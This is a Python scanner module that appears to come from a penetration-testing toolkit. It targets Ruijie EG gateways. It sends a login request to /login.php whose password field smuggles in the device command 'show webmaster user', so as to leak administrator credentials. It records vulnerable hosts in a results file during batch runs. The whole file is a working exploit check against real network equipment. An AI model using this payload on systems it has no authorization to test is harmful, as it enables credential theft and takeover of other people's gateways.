#! /usr/bin/python3
# -*- encoding: utf-8 -*-

from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
import urllib3
urllib3.disable_warnings()
class RuiJie_E_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/login.php'
        data = "username=admin&password=admin?show+webmaster+user"
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header,data=data)
            # req2 = requests.get(url3, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "data" in req.text and req.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("RuiJie", f"存在Ruijie-EG易网关用户密码泄漏漏洞")
                    OutPrintInfo("RuiJie", url2)
                    OutPrintInfo("RuiJie", f"Data: {data}")
                else:
                    OutPrintInfoSuc("RuiJie", f"存在Ruijie-EG易网关用户密码泄漏漏洞 {url2}")
                    with open("./result/ruijie_e_rce.txt","a") as w:
                        w.write(f"{url2}\n")
        except Exception:
            if not self.batch:
                OutPrintInfo("RuiJie", "不存在Ruijie-EG易网关用户密码泄漏漏洞")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("RuiJie", "开始检测Ruijie-EG易网关用户密码泄漏漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("RuiJie", "Ruijie-EG易网关用户密码泄漏漏洞检测结束")
